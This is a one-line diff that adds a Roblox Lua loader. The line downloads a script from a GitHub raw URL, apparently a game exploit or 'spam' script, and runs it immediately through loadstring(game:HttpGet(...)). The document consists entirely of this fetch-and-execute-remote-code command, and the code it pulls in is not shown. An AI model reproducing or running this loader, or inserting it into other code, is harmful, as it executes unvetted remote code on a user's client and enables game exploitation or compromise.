@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vortexorbimagine/loaders/main/loaders/wanted-update-spam1-h4nzeibvfzybyw.lua"))()
